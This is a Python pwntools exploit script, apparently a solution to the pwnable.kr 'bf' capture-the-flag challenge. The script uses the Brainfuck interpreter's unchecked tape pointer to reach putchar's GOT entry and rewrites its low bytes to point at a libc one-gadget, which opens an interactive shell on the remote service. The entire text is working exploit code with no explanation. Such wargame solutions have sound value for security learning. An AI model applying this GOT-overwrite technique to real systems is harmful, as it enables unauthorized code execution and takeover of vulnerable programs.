from pwn import *

g_fname = "./bf"
g_libcname = "/lib/i386-linux-gnu/libc.so.6" if args.LOCAL else "./bf_libc.so"

g_elf = ELF(g_fname)
g_libc = ELF(g_libcname)

context.binary = g_elf
context.log_level = "debug"

tape_addr = 0x0804A0A0
got_putchar = g_elf.got["putchar"]
off_putchar = g_libc.sym["putchar"] # 0x61930
off_ogg = [0x5fbd5, 0x5fbd6]

log.info("putchar@got: %#x" % got_putchar)
log.info("offset of puts in libc: %#x" % off_putchar)
log.info("offset of one gadget used: %#x" % off_ogg[0])

dist2got = tape_addr - got_putchar

payload = '.' # call putchar 1 time, to fill putchar@got with its real address.

# move the pointer to got@putchar and change its lower 3 bytes to onegadget
# payload += "<"*( dist2got - 2) + "-" # byte 2
payload += "<"*(dist2got-1) + "-"*(0x119-0xfb) # byte 1
payload += "<" + "-"*(0x130-0xd5) # byte 0

# move down 1 byte more, set it to 0, satisfy the constraints of ogg(eax==0),
# when call putchar@got 
payload += "<" + ","
payload += "." # invoke onegadget by call putchar

if (args.LOCAL):
    io = process(g_fname)
else:
    io = remote("pwnable.kr", 9001)

pause()

io.sendline(payload)
io.send(b'\0')
io.interactive()